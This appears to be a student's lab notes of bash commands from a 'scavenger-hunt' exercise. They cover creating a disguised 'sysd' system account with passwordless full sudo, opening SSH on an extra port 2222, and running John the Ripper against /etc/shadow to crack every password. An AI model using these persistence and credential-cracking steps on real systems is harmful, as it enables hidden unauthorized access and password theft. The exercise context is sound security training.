#Bash Commands

#Create a sysd user
sudo useradd -r sysd

#Give sysd user a password
sudo passwd sysd
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully

#Give sysd user a system UID < 1000
usermod -u 888 sysd

#Give sysd user a GID equal to UID
groupmod -g 888 sysd

#Give sysd user full sudo access without a password
sysd ALL=(ALL) NOPASSWD:ALL (Inside sudoers file)

#Test sysd user sudo access
sudo -l
User sysd may run the following commands on scavenger-hunt:
    (ALL) NOPASSWD: ALL

#Allow SSH access via port 2222
sudo nano sshd_config

// Inside the sshd_config add a line for port 2222
Port 22
Port 2222

ctrl O to write file

#Test SSHD Configuration
sudo service sshd restart
exit
ssh sysd@192.168.6.105 -p 2222

#Switch back to root user
sudo su

#Crack all the passwords
cd etc
john shadow
